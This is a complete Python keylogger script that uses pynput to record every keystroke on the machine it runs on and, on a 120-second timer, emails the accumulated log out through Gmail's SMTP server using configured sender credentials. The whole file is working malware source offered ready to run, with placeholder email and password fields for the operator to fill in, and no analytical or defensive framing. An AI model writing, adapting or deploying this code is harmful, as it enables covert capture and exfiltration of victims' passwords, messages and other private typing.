import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = ""
        self.interval = time_interval  # Time interval to send logs (seconds)
        self.email = email             # Your email address (sender)
        self.password = password       # Your email password or app password

    def append_to_log(self, string):
        """
        Append the captured key to the log string.
        """
        self.log += string

    def process_key_press(self, key):
        """
        Callback function to process each key press event.
        """
        try:
            current_key = str(key.char)  # Regular character key
        except AttributeError:
            # Special keys (space, enter, etc.)
            if key == key.space:
                current_key = " "
            else:
                current_key = " [" + str(key) + "] "
        self.append_to_log(current_key)

    def report(self):
        """
        Send the current log via email and reset the log.
        Schedule the next report after the interval.
        """
        if self.log:  # Only send if there is something logged
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        """
        Send the log message via SMTP email.
        """
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        """
        Start the keylogger listener and reporting.
        """
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()  # Start the reporting timer
            keyboard_listener.join()

if __name__ == "__main__":
    # Configure your email, password and report interval (in seconds)
    my_keylogger = Keylogger(time_interval=120, email="YourEmail@gmail.com", password="YourPassword")
    my_keylogger.start()
